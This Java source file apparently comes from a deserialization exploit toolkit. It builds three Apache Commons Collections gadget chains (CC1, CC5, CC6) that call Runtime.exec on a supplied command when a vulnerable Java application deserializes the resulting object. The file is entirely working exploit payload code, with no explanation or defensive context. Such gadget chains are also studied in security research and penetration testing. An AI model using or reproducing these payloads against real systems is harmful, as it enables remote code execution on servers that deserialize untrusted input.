package utils;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;
import java.util.PriorityQueue;

/**
 * @author Whoopsunix
 */
public class Serializer {
    public static Object cc1(String command) throws Exception {
        // CC1
        final String[] execArgs = new String[]{command};

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, execArgs)
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap map = new HashMap();
        map.put("value", "value");
        Map<Object, Object> transMap = TransformedMap.decorate(map, null, chainedTransformer);

        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler annotationInvocationHandler = (InvocationHandler) constructor.newInstance(Target.class, transMap);

        return annotationInvocationHandler;
    }

    public static Object cc6(String command) throws Exception {
        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{new ConstantTransformer(1)});
        final String[] execArgs = new String[]{command};
        final Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{
                        String.class, Class[].class}, new Object[]{
                        "getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{
                        Object.class, Object[].class}, new Object[]{
                        null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class}, execArgs),
                new ConstantTransformer(1)};


        final Map innerMap = new HashMap();
        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "x");

        // way A
        HashMap hashMap = new HashMap();
        hashMap.put(entry, "x");
        lazyMap.clear();
        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
        return hashMap;
    }

    public static Object cc5(String command) throws Exception {


        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{new ConstantTransformer(1)});
        final String[] execArgs = new String[]{command};
        final Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{
                        String.class, Class[].class}, new Object[]{
                        "getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{
                        Object.class, Object[].class}, new Object[]{
                        null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class}, execArgs),
                new ConstantTransformer(1)};

        final Map innerMap = new HashMap();
        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "x");
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Reflections.setFieldValue(val, "val", entry);
        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);

        return val;
    }

}
